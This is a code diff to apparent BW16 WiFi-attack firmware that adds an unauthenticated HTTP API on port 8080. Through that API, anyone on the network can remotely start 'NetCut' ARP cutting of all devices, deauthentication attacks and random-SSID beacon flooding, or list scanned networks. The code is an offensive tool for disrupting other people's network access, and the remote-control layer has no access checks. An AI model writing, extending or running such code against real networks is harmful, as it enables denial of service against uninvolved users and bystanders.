@@ -80,8 +80,15 @@ extern u8 rtw_get_band_type(void);
 bool apActive = false;
 int status = WL_IDLE_STATUS;
 WiFiServer server(80);
+WiFiServer webAPIServer(8080);  // API Server untuk kontrol WiFi
 String ssid="";
 uint32_t current_num = 0;
+
+// ============================================
+// WEB API Control Variables
+// ============================================
+bool webAPIEnabled = false;
+bool netcutRunning = false;
 
 const char* rick_roll[8] = {
       "01 Never gonna give you up",
@@ -148,11 +155,11 @@ void drawMenu() {
   u8g2.setFont(u8g2_font_ncenB08_tr);
 
   if (currentState == MAIN_MENU) {
-    const char* items[] = {"Scan Networks", "Random SSID", "Rickroll SSID", "NetCut ARP", "Stop All"};
-    max_menu_items = 5;
+    const char* items[] = {"Scan Networks", "Random SSID", "Rickroll SSID", "NetCut ARP", "Web API", "Stop All"};
+    max_menu_items = 6;
     u8g2.drawStr(0, 10, "--- Main Menu ---");
     for (int i = 0; i < max_menu_items; i++) {
-      int y = 25 + (i * 12);
+      int y = 22 + (i * 10);
       if (i == selected_menu_item) {
         u8g2.drawStr(0, y, ">");
       }
@@ -207,6 +214,86 @@ String parseRequest(String request) {
 }
 
 bool serveBegined = false;
+
+// ============================================
+// WEB API HANDLER - Control via HTTP
+// ============================================
+void handleWebAPI(WiFiClient &client) {
+  String request;
+  request.reserve(256);
+  
+  while (client.connected()) {
+    if (client.available()) {
+      char character = client.read();
+      if (character == '\n') {
+        String path = parseRequest(request);
+        Serial.println("[API] Request: " + path);
+        
+        // Parse command from path
+        String response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n";
+        
+        if (path.startsWith("/api/status")) {
+          response += "{\"status\":\"online\",\"device\":\"BW16-NetCut\",\"api_version\":\"1.0\"}";
+        } 
+        else if (path.startsWith("/api/netcut/scan")) {
+          int found = netcutScanDevices();
+          response += "{\"action\":\"scan\",\"devices_found\":" + String(found) + "}";
+          Serial.printf("[API] Netcut scan: %d devices\n", found);
+        }
+        else if (path.startsWith("/api/netcut/cut")) {
+          netcutCutAll();
+          response += "{\"action\":\"cut_all\",\"status\":\"active\"}";
+          Serial.println("[API] NetCut Cut All activated");
+        }
+        else if (path.startsWith("/api/netcut/resume")) {
+          netcutResumeAll();
+          response += "{\"action\":\"resume_all\",\"status\":\"restored\"}";
+          Serial.println("[API] NetCut Resume All activated");
+        }
+        else if (path.startsWith("/api/attack/deauth")) {
+          randomSSID = false;
+          rickroll = false;
+          ssid = "";
+          response += "{\"action\":\"deauth\",\"status\":\"starting\"}";
+          Serial.println("[API] Deauth attack started");
+        }
+        else if (path.startsWith("/api/attack/random")) {
+          randomSSID = true;
+          rickroll = false;
+          ssid = "";
+          response += "{\"action\":\"random_ssid\",\"status\":\"active\"}";
+          Serial.println("[API] Random SSID broadcast started");
+        }
+        else if (path.startsWith("/api/attack/stop")) {
+          deauth_wifis.clear();
+          randomSSID = false;
+          rickroll = false;
+          ssid = "";
+          response += "{\"action\":\"stop_all\",\"status\":\"stopped\"}";
+          Serial.println("[API] All attacks stopped");
+        }
+        else if (path.startsWith("/api/wifi/list")) {
+          response += "{\"networks\":[";
+          for (int i = 0; i < scan_results.size(); i++) {
+            if (i > 0) response += ",";
+            response += "{\"ssid\":\"" + scan_results[i].ssid + "\",\"rssi\":" + String(scan_results[i].rssi) + "}";
+          }
+          response += "]}";
+        }
+        else {
+          response = "HTTP/1.1 404 Not Found\r\n\r\n{\"error\":\"Not found\"}";
+        }
+        
+        client.write(response.c_str());
+        break;
+      }
+      request += character;
+      delay(1);
+    }
+  }
+  delay(10);
+  client.stop();
+}
 
 void createAP(char* ssid, char* channel, char* password){
   int mode;
@@ -394,7 +481,8 @@ void setup() {
   WiFi.enableConcurrent();
   WiFi.status();
   
-  Serial.println("[FIRMWARE] BW16 with NetCut ARP initialized");
+  Serial.println("[FIRMWARE] BW16 with NetCut ARP & Web API initialized");
+  Serial.println("[API] Port 8080 available for HTTP control");
 }
 
 void loop() {
@@ -433,10 +521,20 @@ void loop() {
           currentState = MAIN_MENU;
           selected_menu_item = 0;
         } else if (selected_menu_item == 4) {
+          // Enable Web API
+          webAPIEnabled = true;
+          if (!webAPIServer.begin()) {
+            Serial.println("[API] ERROR: Failed to start Web API server");
+          } else {
+            Serial.println("[API] Web API Server started on port 8080");
+            Serial.println("[API] Access: http://192.168.x.x:8080/api/...");
+          }
+        } else if (selected_menu_item == 5) {
           deauth_wifis.clear();
           randomSSID = false;
           rickroll = false;
           ssid = "";
+          webAPIEnabled = false;
         }
         break;
 
@@ -542,6 +640,14 @@ void loop() {
     const char * ssid_cstr2 = ssid.c_str();
     for(int x=0; x<5; x++){
       wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
+    }
+  }
+
+  // -- WEB API HANDLER --
+  if (webAPIEnabled) {
+    WiFiClient apiClient = webAPIServer.available();
+    if (apiClient) {
+      handleWebAPI(apiClient);
     }
   }
 
